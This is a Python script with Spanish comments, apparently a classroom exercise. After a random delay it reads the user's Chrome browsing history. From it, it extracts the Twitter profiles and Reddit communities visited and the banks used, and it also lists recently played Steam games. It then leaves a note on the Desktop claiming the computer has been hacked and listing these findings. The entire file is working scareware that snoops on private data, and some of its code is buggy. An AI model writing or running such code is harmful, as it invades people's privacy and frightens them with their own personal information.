import os
import sqlite3
from shutil import copyfile
from time import sleep
from random import randrange
from pathlib import Path
import re
import glob

NOMBRE_FICHERO = "PARA_TI.txt"


def obtener_historial_chrome(ruta_usuario):
    urls = None
    while not urls:
        try:
            # ruta_historial = ruta_usuario + "/.config/google-chrome/Default/History"
            # En Windows la ruta al historia del chrome es "\\AppData\\local\\Google\\Chrome\\User Data\\Default\\
            # History"
            ruta_historial = ruta_usuario + "\\AppData\\local\\Google\\Chrome\\User Data\\Default\\History"
            temp_history = ruta_historial + "temp"
            copyfile(ruta_historial, temp_history)
            conexion = sqlite3.connect(temp_history)
            cursor = conexion.cursor()
            cursor.execute("SELECT TITLE last_visit_time, url from urls ORDER BY last_visit_time ASC")
            urls = cursor.fetchall()
            conexion.close()
            return urls
        except sqlite3.OperationalError as error:
            print("O Chrome no existe o esta usando la base de datos, en cualquier caso, no se puede acceder.")
            sleep(1)


def generar_fichero(ruta_usuario):
    fichero_hacker = open(ruta_usuario + "\\Desktop\\" + NOMBRE_FICHERO, "w")
    # En windows cambiar /Escritorio/ por \\Desktop\\
    fichero_hacker.write("Hola, He hackeado tu ordenador:\n")
    return fichero_hacker


def tiempo_dormir():
    tiempo_espera = randrange(1, 3)
    print("Durmiendo {} horas".format(tiempo_espera))
    # sleep(tiempo_espera * 60 * 60)
    # Esto es para que en vez de segunos que es la unidad en la que trabaja el sleep sean horas
    sleep(tiempo_espera)


def obtener_ruta_usuario():
    return "{}/".format(Path.home())


def mirar_twitter_chrome(fichero_hacker, historial_chrome):
    perfiles_visitados_twitter = []
    for item in historial_chrome[:10]:
        resultados = re.findall("https://x.com/([A-Za-z0-9]+)$", item[1])
        if resultados and resultados[0] not in ["notifications", "home"]:
            perfiles_visitados_twitter.append(resultados[0])
    fichero_hacker.write("He visto que en Twitter has estado husmeando en los perfiles de {}...\n"
                         .format(", ".join(perfiles_visitados_twitter)))
    print(perfiles_visitados_twitter)


def mirar_reddit_chrome(fichero_hacker, historial_chrome):
    perfiles_visitados_reddit = []
    for item in historial_chrome[:10]:
        resultados = re.findall("https://www.reddit.com/r/([A-Za-z0-9.]+)", item[1])
        if resultados and resultados[0] not in ["notifications", "home"]:
            perfiles_visitados_reddit.append(resultados[0])
    fichero_hacker.write("Veo que tambien miras a {} en Reddit...\n"
                         .format(", ".join(perfiles_visitados_reddit)))
    print(perfiles_visitados_reddit)


def mirar_banco_chrome(fichero_hacker, historial_chrome):
    su_banco = []

    banco = ["BBVA", "Santander", "Bankia", "Sabadell", "Abanca"]
    for item in historial_chrome:
        for b in banco:
            if b.lower() in item[0].lower():
                su_banco.append(b)
                banco.remove(b)
    fichero_hacker.write("Ademas se que has usado el banco {}...\n"\
                         .format(", ".join(su_banco)))


""" Este es el codigo de Nate, pero tiene el problema de que solo te muestra un banco de los muchos que puede haber
en el historia. Por eso se queda activo el codigo copiado de arriba.
def mirar_banco(fichero_hacker, historial_chrome):
    his_bank = None
    banks = ["BBVA", "Santander", "Bankia", "Sabadell", "Abanca"]
    for item in historial_chrome:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    fichero_hacker.write("Ademas se que has usado los bancos {}".format(his_bank))
"""


def mirar_juegos_steam(fichero_hacker):
    # Ten en cuenta que en el ubuntu no tienes steam asi que esta
    # funcion la tienes que comentar
    try:
        steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
        games = []
        game_paths = glob.glob(steam_path)
        game_paths.sort(key=os.path.getmtime, reverse=True)
        for game_path in game_paths:
            games.append(game_path.split("\\")[-1])
        fichero_hacker.write("Y, por lo que veo, has estado jugando a {}, interesante...\n".format(", ".join(games[:3])))
        print(games)
    except FileNotFoundError:
        return None


def main():
    # Esperar las horas aleatorias
    tiempo_dormir()
    # Definir la ruta donde queremos actual
    ruta_usuario = obtener_ruta_usuario()
    # Obtener el historial
    historial_chrome = obtener_historial_chrome(ruta_usuario)
    # Generar el fichero
    fichero_hacker = generar_fichero(ruta_usuario)
    # Mirar y escribir
    mirar_twitter_chrome(fichero_hacker, historial_chrome)
    mirar_reddit_chrome(fichero_hacker, historial_chrome)
    mirar_banco_chrome(fichero_hacker, historial_chrome)
    mirar_juegos_steam(fichero_hacker)


if __name__ == "__main__":
    main()

